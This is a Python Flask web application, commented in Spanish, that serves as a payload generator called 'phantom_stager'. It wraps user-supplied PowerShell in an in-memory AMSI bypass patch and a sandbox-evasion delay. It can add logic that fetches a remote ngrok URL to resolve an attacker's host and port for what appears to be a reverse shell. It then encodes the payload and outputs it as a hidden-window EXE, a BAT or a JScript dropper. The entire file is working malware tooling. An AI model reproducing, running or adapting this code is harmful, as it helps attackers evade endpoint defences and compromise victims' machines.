from flask import Flask, render_template, request, send_file, jsonify
import base64
import io
import os
import uuid
import subprocess
import random
import datetime
import socket
import platform
import logging

app = Flask(__name__)
class IgnoreApiInfoFilter(logging.Filter):
    def filter(self, record):
        return "/api/info" not in record.getMessage()

log = logging.getLogger('werkzeug')
log.addFilter(IgnoreApiInfoFilter())
#log = logging.getLogger('werkzeug')
#log.setLevel(logging.ERROR)
def get_system_info():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
    except:
        ip = "127.0.0.1"

    return {
        "ip": ip,
        "port": 5000,
        "os": platform.system() + " " + platform.release(),
        "time": datetime.datetime.now().strftime("%H:%M:%S"),
        "cpu": random.randint(10, 80),
        "ram": random.randint(20, 90)
    }

# Nombre de operación élite
FILE_NAME = "phantom_stager"

def build_payload(ps_code, conn_mode, nurl):
    # Motor de Evasión v5: AMSI Patching + Sandbox Delay + B64
    amsi_patch = (
        "$a=[Ref].Assembly.GetType('System.Management.Automation.A'+'msi'+'Utils');"
        "$b=$a.GetField('am'+'si'+'Context','NonPublic,Static');"
        "$c=$b.GetValue($null);"
        "$ptr=[Runtime.InteropServices.Marshal]::ReadIntPtr($c,8);"
        "$patch=[Byte[]](0xB8,0x57,0x00,0x07,0x80,0xC3);"
        "[Runtime.InteropServices.Marshal]::Copy($patch,0,$ptr,6);"
    )
    delay = "Start-Sleep -s (Get-Random -Min 15 -Max 30);"
    
    payload_final = amsi_patch + delay
    
    if conn_mode == 'dynamic' and nurl:
        ngrok_logic = (
            f"$u='{nurl}';$wc=New-Object System.Net.WebClient;"
            "$wc.Headers.Add('User-Agent','Mozilla/5.0');"
            "$s=$wc.DownloadString($u);$n=($s|findstr '<SS>').Split('<SS>');"
            "$rh=$n.Split(':');$rp=$n.Split(':');"
        )
        ps_code = ps_code.replace("192.168.1.42", "$rh").replace("4443", "$rp")
        payload_final += ngrok_logic
    
    payload_final += ps_code
    unicode_bytes = payload_final.encode('utf-16-le')
    return base64.b64encode(unicode_bytes).decode()

@app.route('/')
def index():
    return render_template('index.html')
@app.route("/api/info")
def api_info():
    return jsonify(get_system_info())
@app.route('/generate', methods=['POST'])
def generate():
    ps_code = request.form.get('ps_code', '')
    mode = request.form.get('conn_mode')
    nurl = request.form.get('nurl')
    fmt = request.form.get('format')
    
    if not ps_code:
        return "Error: Buffer vacío", 400

    b64 = build_payload(ps_code, mode, nurl)
    
    if fmt == 'exe':
        # --- MOTOR DE COMPILACIÓN C# PARA EXE ---
        temp_id = uuid.uuid4().hex[:6]
        cs_file = f"temp_{temp_id}.cs"
        exe_file = f"{FILE_NAME}.exe"
        
        # Código fuente C# que invoca a PowerShell de forma invisible
        cs_source = f'''
        using System;
        using System.Diagnostics;
        class Program {{
            static void Main() {{
                ProcessStartInfo psi = new ProcessStartInfo();
                psi.FileName = "powershell.exe";
                psi.Arguments = "-WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -EncodedCommand {b64}";
                psi.UseShellExecute = false;
                psi.CreateNoWindow = true;
                Process.Start(psi);
            }}
        }}'''
        
        with open(cs_file, "w") as f: f.write(cs_source)
        
        # Compilación usando Mono mcs (Target: winexe para que no abra consola)
        subprocess.run(["mcs", "-out:" + exe_file, "-target:winexe", cs_file], check=True)
        
        with open(exe_file, "rb") as f: data = f.read()
        
        # Limpieza de archivos temporales en Kali
        os.remove(cs_file)
        os.remove(exe_file)
        
        return send_file(io.BytesIO(data), as_attachment=True, download_name=f"{FILE_NAME}.exe")

    elif fmt == 'bat':
        content = f"@echo off\nstart /b powershell -W Hidden -NoP -Enc {b64}\nexit"
        return send_file(io.BytesIO(content.encode()), as_attachment=True, download_name=f"{FILE_NAME}.bat")

    elif fmt == 'js':
        content = f"var w=new ActiveXObject('WScript.Shell');w.Run('powershell -W Hidden -NoP -Enc {b64}', 0, false);"
        return send_file(io.BytesIO(content.encode()), as_attachment=True, download_name=f"{FILE_NAME}.js")

    return "Error", 400

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
